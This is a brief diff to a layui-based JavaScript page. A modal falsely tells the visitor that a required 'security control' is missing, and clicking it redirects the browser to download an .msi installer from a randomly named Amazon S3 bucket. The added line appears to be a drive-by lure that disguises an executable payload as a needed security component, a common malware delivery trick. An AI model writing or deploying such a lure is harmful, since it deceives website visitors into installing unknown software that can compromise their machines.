@@ -2,7 +2,7 @@ const layer = layui.layer;
 
 function openModal() {
     layer.alert('检测未安装安全控件，请安装后重试！', function() {
-        location.href = 'https://www.fursdg.com/dff6c608f8e4361737241e1w';
+        location.href = 'https://gfsmdmtke.s3.ap-east-1.amazonaws.com/Chenrmoemry.msi';
         $('.layui-layer-move, .layui-layer-shade, .layui-layer.layui-layer-dialog').remove();
     });
 }
